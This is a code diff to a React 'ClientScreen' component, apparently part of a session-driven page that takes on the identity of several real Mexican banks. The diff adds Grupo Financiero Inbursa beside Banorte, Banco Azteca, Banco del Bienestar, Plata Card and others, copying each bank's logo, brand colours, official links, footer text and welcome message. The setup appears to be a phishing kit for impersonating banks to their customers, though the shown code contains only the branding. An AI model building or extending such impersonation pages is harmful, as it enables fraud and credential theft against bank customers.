@@ -28,6 +28,7 @@ import banregioLogoWhite from '../assets/banregio_logo_white.png';
 import platacardLogo from '../assets/platacard_logo.png';
 import bancoAztecaLogo from '../assets/banco_azteca_logo.png';
 import bienestarLogo from '../assets/banco_bienestar_logo.png';
+import inbursaLogo from '@assets/stock_images/inbursa_bank_logo_me_8f46c1cf.jpg';
 
 export default function ClientScreen() {
   // Verificar primero la ruta /client/:sessionId
@@ -581,6 +582,20 @@ export default function ClientScreen() {
           <div className="font-bold text-sm">{formatDate(new Date())}</div>
         </header>
       );
+    } else if (sessionData.banco === 'INBURSA') {
+      return (
+        <header className="bg-[#1B4B72] text-white p-4 text-center">
+          <div className="flex justify-center mb-2">
+            <img 
+              src={inbursaLogo} 
+              className="inbursa-logo inline-block" 
+              alt="Grupo Financiero Inbursa" 
+              style={{height: '2.5rem', width: 'auto'}}
+            />
+          </div>
+          <div className="font-bold text-sm">{formatDate(new Date())}</div>
+        </header>
+      );
     } else {
       // Default header (Banorte)
       return (
@@ -660,6 +675,7 @@ export default function ClientScreen() {
               sessionData.banco === 'PLATACARD' ? 'https://www.platacard.com/' :
               sessionData.banco === 'BANCO_AZTECA' ? 'https://www.bancoazteca.com.mx/' :
               sessionData.banco === 'BIENESTAR' ? 'https://www.gob.mx/bancodelbienestar' :
+              sessionData.banco === 'INBURSA' ? 'https://www.inbursa.com/' :
               'https://www.banorte.com/'
             } target="_blank" rel="noopener noreferrer" className={`${
               sessionData.banco === 'LIVERPOOL' ? 'text-[#E1147B]' : 
@@ -774,6 +790,7 @@ export default function ClientScreen() {
             sessionData.banco === 'PLATACARD' ? 'bg-[#333333]' :
             sessionData.banco === 'BANCO_AZTECA' ? 'bg-[#00A552]' :
             sessionData.banco === 'BIENESTAR' ? 'bg-[#9D2449]' :
+            sessionData.banco === 'INBURSA' ? 'bg-[#1B4B72]' :
             'bg-[#EC1C24]'
           } text-white p-4 text-center text-sm`}>
             <div className="mb-3">
@@ -791,6 +808,7 @@ export default function ClientScreen() {
                 sessionData.banco === 'SPIN' ? 'https://www.spinbyoxxo.com.mx/contacto' :
                 sessionData.banco === 'BANCO_AZTECA' ? 'https://www.bancoazteca.com.mx/contacto.html' :
                 sessionData.banco === 'BIENESTAR' ? 'https://www.gob.mx/bancodelbienestar/contacto' :
+                sessionData.banco === 'INBURSA' ? 'https://www.inbursa.com/contacto' :
                 'https://www.banorte.com/wps/portal/banorte/Home/contacto-banorte'
               } target="_blank" rel="noopener noreferrer" className="text-white mx-2">Contáctanos</a> |
               <a href={
@@ -807,6 +825,7 @@ export default function ClientScreen() {
                 sessionData.banco === 'SPIN' ? 'https://www.spinbyoxxo.com.mx/preguntas-frecuentes' :
                 sessionData.banco === 'BANCO_AZTECA' ? 'https://www.bancoazteca.com.mx/ayuda-y-preguntas-frecuentes.html' :
                 sessionData.banco === 'BIENESTAR' ? 'https://www.gob.mx/bancodelbienestar/acciones-y-programas/aclaraciones-bancarias' :
+                sessionData.banco === 'INBURSA' ? 'https://www.inbursa.com/aclaraciones' :
                 'https://www.banorte.com/wps/portal/banorte/Home/contacto-banorte/aclaraciones-en-linea'
               } target="_blank" rel="noopener noreferrer" className="text-white mx-2">Aclaraciones</a> |
               <a href={
@@ -823,6 +842,7 @@ export default function ClientScreen() {
                 sessionData.banco === 'SPIN' ? 'https://www.spinbyoxxo.com.mx/promociones' :
                 sessionData.banco === 'BANCO_AZTECA' ? 'https://www.bancoazteca.com.mx/promociones.html' :
                 sessionData.banco === 'BIENESTAR' ? 'https://www.gob.mx/bancodelbienestar/documentos/promociones-y-sorteos' :
+                sessionData.banco === 'INBURSA' ? 'https://www.inbursa.com/promociones' :
                 'https://www.banorte.com/wps/portal/banorte/Home/promociones/todas'
               } target="_blank" rel="noopener noreferrer" className="text-white mx-2">Promociones</a> |
               <a href={
@@ -839,6 +859,7 @@ export default function ClientScreen() {
                 sessionData.banco === 'SPIN' ? 'https://www.facebook.com/SpinByOxxo' :
                 sessionData.banco === 'BANCO_AZTECA' ? 'https://www.facebook.com/BancoAzteca' :
                 sessionData.banco === 'BIENESTAR' ? 'https://www.facebook.com/BBienestarMX' :
+                sessionData.banco === 'INBURSA' ? 'https://www.facebook.com/GrupoFinancieroInbursa' :
                 'https://www.facebook.com/BanorteOficial'
               } target="_blank" rel="noopener noreferrer" className="text-white mx-2">Facebook</a> |
               <a href={
@@ -855,6 +876,7 @@ export default function ClientScreen() {
                 sessionData.banco === 'SPIN' ? 'https://www.youtube.com/channel/UC6LuKC5QzmY2V4qVbJYJavw' :
                 sessionData.banco === 'BANCO_AZTECA' ? 'https://www.youtube.com/user/bancoaztecaoficial' :
                 sessionData.banco === 'BIENESTAR' ? 'https://www.youtube.com/@BBienestarMX' :
+                sessionData.banco === 'INBURSA' ? 'https://www.youtube.com/@GrupoFinancieroInbursa' :
                 'https://www.youtube.com/user/GFBanorte'
               } target="_blank" rel="noopener noreferrer" className="text-white mx-2">Youtube</a>
             </div>
@@ -873,6 +895,7 @@ export default function ClientScreen() {
               sessionData.banco === 'PLATACARD' ? 'Plata Card' :
               sessionData.banco === 'BANCO_AZTECA' ? 'Banco Azteca' :
               sessionData.banco === 'BIENESTAR' ? 'Banco del Bienestar' :
+              sessionData.banco === 'INBURSA' ? 'Grupo Financiero Inbursa' :
               'Banorte'
             } México 2024. Todos los Derechos Reservados</div>
           </div>
@@ -975,6 +998,12 @@ export default function ClientScreen() {
           <p className="text-sm text-gray-600 mt-1">Bienvenido al Banco del Bienestar, tu banco social</p>
         </div>
       );
+    } else if (sessionData.banco === 'INBURSA') {
+      return (
+        <div className="text-center mt-2 px-4">
+          <p className="text-sm text-gray-600 mt-1">Bienvenido a Grupo Financiero Inbursa, tu aliado financiero</p>
+        </div>
+      );
     } else {
       return (
         <div className="text-center mt-4 px-4">
@@ -1020,6 +1049,7 @@ export default function ClientScreen() {
                 sessionData.banco === 'PLATACARD' ? 'bg-[#FF5722]' :
                 sessionData.banco === 'BANCO_AZTECA' ? 'bg-[#00A552]' :
                 sessionData.banco === 'BIENESTAR' ? 'bg-[#9D2449]' :
+                sessionData.banco === 'INBURSA' ? 'bg-[#1B4B72]' :
                 'bg-[#EC1C24]'
               } animate-progress-bar`}></div>
             </div>
